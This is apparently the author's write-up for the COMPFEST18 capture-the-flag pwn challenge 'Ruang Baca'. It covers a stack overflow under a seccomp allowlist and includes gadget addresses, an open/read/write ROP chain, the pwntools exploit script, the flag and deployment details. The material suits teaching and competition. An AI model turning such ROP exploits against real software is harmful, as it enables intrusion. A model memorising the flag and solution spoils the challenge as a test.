# Ruang Baca — seccomp ORW

**Category:** pwn · **Flag:** `COMPFEST18{n0_3x3cv3_n0_mm4p_just_0p3n_r34d_wr1t3}`

---

## 1. Recon

```
$ checksec --file=./chall
RELRO           STACK CANARY     NX          PIE      RPATH     RUNPATH     Symbols
Partial RELRO   Canary found     NX enabled  No PIE   No RPATH  No RUNPATH  2342
```

`Canary found` is a checksec false positive on static binaries: it matches
`__stack_chk_fail` shipped inside `libc.a`. The binary is built with
`-fno-stack-protector` and the vulnerable function has no canary at all:

```
$ objdump -d -M intel chall | sed -n '/<desk>:/,/ret/p' | grep -c fs:0x28
0
```

Static and no-PIE, so every address in the image is a constant and there is
nothing to leak.

The banner is the first half of the briefing:

```
=== Ruang Baca ===
Arsip          : /flag.txt
Kertas catatan : 0x4e3340
pesan  >
```

It hands you the path to read and the address of a `.bss` scratch buffer.

## 2. The filter is the actual challenge

```
$ seccomp-tools dump ./chall
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0011
 0009: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0011
 0010: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

Five syscalls, everything else `KILL_PROCESS`. That closes every reflex:

| Reflex | Outcome |
|---|---|
| `execve("/bin/sh")` / `execveat` | not on the allowlist, process killed |
| shellcode + `mmap`/`mprotect` for RWX | both killed, and NX is on anyway |
| SROP via `rt_sigreturn` | killed — this is a sibling challenge, not this one |
| `openat` (syscall 257) out of habit | killed; only `open` (2) is on the list |

What remains is exactly enough to read a file and print it: **open, read, write**.

## 3. The bug

```c
static void desk(void)
{
    char buf[0x40];
    printf("pesan  > ");
    read(0, buf, 0x200);        // 0x200 into 0x40
}
```

```
4018b0: sub  rsp,0x40
4018c3: lea  rax,[rbp-0x40]     <- buf
4018d4: call __libc_read
4018da: leave
4018db: ret
```

`buf` is at `rbp-0x40`, saved `rbp` takes the next 8 bytes.

> **Saved RIP is at `buf + 0x48` (72 bytes).**

Confirmed with a cyclic pattern: at the faulting `ret`, `[$rsp]` holds
`0x616161616161616a`, which `cyclic_find(n=8)` places at index `0x48`.

## 4. The gadget kit

The binary ships a clean, complete set at a single fixed address:

```
$ ROPgadget --binary chall | grep -E ': pop (rdi|rsi|rdx|rax) ; ret$'
0x00000000004017b5 : pop rdi ; ret
0x00000000004017b7 : pop rsi ; ret
0x00000000004017b9 : pop rdx ; ret
0x00000000004017bb : pop rax ; ret
0x00000000004017bd : syscall
```

Two bytes apart, in order. No scavenging through static glibc required — the
time budget is meant to go on the filter, not on gadget archaeology.

Other constants:

```
/flag.txt   0x4a6008    (standalone, NUL-terminated)
scratch     0x4e3340    (.bss, also printed by the banner)
```

## 5. The chain

```
open("/flag.txt", O_RDONLY)   -> fd 3
read(3, scratch, 0x80)
write(1, scratch, 0x80)
exit_group(0)
```

Each syscall is nine qwords:

```
pop rdi ; <arg0>
pop rsi ; <arg1>
pop rdx ; <arg2>
pop rax ; <nr>
syscall
```

`open` takes the path in `rdi` and the flags in `rsi`, so every argument
register gets a value you already have: the fixed address of `/flag.txt`, then
zero twice. No dirfd, and no `AT_FDCWD` constant to remember.

### Payload map (360 bytes)

| Offset | Size | Contents |
|---|---|---|
| `0x000` | `0x48` | padding (`buf[0x40]` + saved `rbp`) |
| `0x048` | 72 | `open(0x4a6008, 0, 0)` |
| `0x090` | 72 | `read(3, scratch, 0x80)` |
| `0x0d8` | 72 | `write(1, scratch, 0x80)` |
| `0x120` | 72 | `exit_group(0)` |

`0x48 + 4*72 = 360` bytes into a `0x200` (512) read. 152 bytes of headroom.

### Why fd 3, and how it was checked

`open` returns the lowest free descriptor. 0/1/2 are the socket that redpwn
jail hands the process, nothing else is opened before the overflow, so the flag
lands on **fd 3**. This was verified against the deployed container rather than
assumed, with a negative control:

```
open+fd3   -> b'COMPFEST18{n0_3x3cv3_n0_mm4p_just_0p3n_r34d_wr1t3}'
open+fd4   -> b'\x00\x00\x00...'        (read fails, scratch stays zeroed)
openat 257 -> b''                       (killed by the filter, no output)
```

## 6. Exploit

See `solve.py`. Core:

```python
OFFSET  = 0x48
POP_RDI = elf.sym['gadgets']          # 0x4017b5, +2 rsi, +4 rdx, +6 rax, +8 syscall
PATH    = next(elf.search(b'/flag.txt\0'))

io.recvuntil(b'Kertas catatan : ')
SCRATCH = int(io.recvline().strip(), 16)   # the banner tells us

def sys(nr, rdi, rsi, rdx):
    return flat(POP_RDI, rdi, POP_RSI, rsi, POP_RDX, rdx, POP_RAX, nr, SYSCALL)

payload  = b'A' * OFFSET
payload += sys(constants.SYS_open,    PATH, 0, 0)
payload += sys(constants.SYS_read,   3, SCRATCH, 0x80)
payload += sys(constants.SYS_write,  1, SCRATCH, 0x80)
payload += sys(constants.SYS_exit_group, 0, 0, 0)

io.sendafter(b'pesan  > ', payload)
```

Run it from `writeup/`:

```
python3 solve.py                                       # local ../src/chall
python3 solve.py REMOTE HOST=34.1.203.129 PORT=5600    # remote
```

Local runs need a readable `/flag.txt` on the host; the deployed container
provides one inside the jail chroot.

## 7. Build & deploy

```
cd src && make                 # produces src/chall with the pinned flags
docker compose up --build -d   # serves on 0.0.0.0:5600
```

`Dockerfile` uses pwn.red/jail (redpwn jail / nsjail), which forks a fresh
isolated process per TCP connection. The jail chroots to `/srv`, so
`COPY src/flag.txt /flag.txt` in the chroot stage is what makes the banner path
`/flag.txt` resolve. `JAIL_PORT=5600` matches the port compose publishes.

## 8. Layout

```
./
  Dockerfile            pwn.red/jail deployment
  challenge.yml         CTFd challenge metadata
  docker-compose.yml    build + serve on :5600
  README.md             author-facing
src/
  chall.c  Makefile     source and build
  chall                 build output
  flag.txt              the real flag, baked into the image
  README.player.md      player README, packed into the zip
public/
  dist-ruang-baca.zip   the only thing players get
writeup/
  solve.py  README.md  checksec.txt  seccomp-dump.txt
```
